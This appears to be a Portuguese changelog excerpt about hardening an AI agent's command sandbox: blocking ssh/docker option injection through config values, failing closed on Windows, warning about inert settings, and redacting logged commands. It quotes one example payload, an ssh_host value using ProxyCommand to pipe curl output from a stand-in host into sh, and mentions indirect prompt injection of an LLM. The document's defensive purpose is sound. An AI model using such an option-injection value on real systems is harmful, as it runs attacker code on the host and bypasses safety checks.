- **Sandbox: valor de config que comecaria com `-` deixa de virar OPCAO do `ssh`/`docker`
  (#1225).** O `sh_quote` da #1231 garante que o comando chegue como **um token** — o que
  barra injecao de comando e nao barra injecao de *opcao*. Na linha
  `ssh {host} -- sh -lc …` o host fica **antes** do `--`, entao um
  `agent.sandbox.ssh_host: "-oProxyCommand=curl http://x|sh"` continua sendo um token so e
  o `ssh` o le como flag: o comando do atacante executa no host **local**, ja depois de o
  `safety_gate` ter aprovado outra coisa. O mesmo vale para `agent.sandbox.image`, que e
  posicional do `docker run` e desloca tudo que vem depois.
  Nenhum host de verdade e nenhuma imagem de verdade comeca com `-`, entao a defesa e
  recusar, em tres camadas: o `garra config check` reporta Error antes do boot, o
  `sandbox_policy_from` nao constroi backend nenhum (imagem cai no default) com um `warn!`
  que **nunca** loga o valor, e o proprio `wrap_command` recusa fail-closed — antes do
  `is_available()`, para que num host sem cliente `ssh` o erro de backend ausente nao
  mascare o de injecao de opcao. O conserto estrutural, montar argv em vez de uma linha de
  shell, fica como tracking na #1225 (slices S2/S3), como ja recomendado na #1231.
- **Sandbox fora de unix passa a falhar fechado (#1225).** O `BashTool` escolhe
  `powershell -Command` no Windows e receberia uma linha com quoting POSIX, que o
  PowerShell nao reparseia da mesma forma (la a aspa simples escapa como `''`). Antes isso
  era so uma nota de documentacao: a contencao parecia ligada e nao continha. Agora o
  `wrap_command` devolve erro e o `config check` reporta Error quando a secao esta ligada
  em `cfg!(windows)`.
- **Sandbox que esta ligado e inerte passa a ser reportado (#1225).** Aviso quando
  `mode: all` tem `bash` em `elevated` — como so a tool `bash` e envolvida hoje, isso
  equivale a `mode: off` com passos extras — e quando uma entrada de `sandboxed_tools` ou
  `elevated` nao e uma tool que o sandbox saiba envolver; o finding nomeia a entrada,
  porque apontar o typo (`Bash`, `run_tests`) e a razao de ele existir. Nomes agora sao
  trimados na conversao, entao `" bash"` vindo de uma lista YAML deixa de ser um item que
  existe no arquivo e nao existe para o codigo; caixa NAO e normalizada, porque o registry
  de tools e case-sensitive e "consertar" escondia o erro.
- **O aviso de que `backend: ssh` nao e contencao virou incondicional (#1225).** Antes so
  aparecia junto com `network_disabled`/`mount_workdir` ligados; quem desligava os dois
  passava a ver um `config check` limpo para uma configuracao que executa comandos numa
  maquina remota com rede e disco inteiros. A palavra "sandbox" na chave promete o que
  este backend nao faz, entao o operador le isso uma vez sempre.
- **Comando do sandbox deixa de ir inteiro para o log (#1225).** O caminho sandboxado
  virou alcancavel com esta serie, e o que ele registrava era a linha de shell crua
  escrita pelo LLM — que o projeto ja trata como influenciavel por injecao indireta de
  prompt (#1213) e que pode carregar credencial (`curl -H "Authorization: Bearer …"`).
  Agora passa por `garraia_security::redact_secrets` e e truncada em 120 chars, cortando
  em fronteira de char para nao panicar em UTF-8 multibyte.
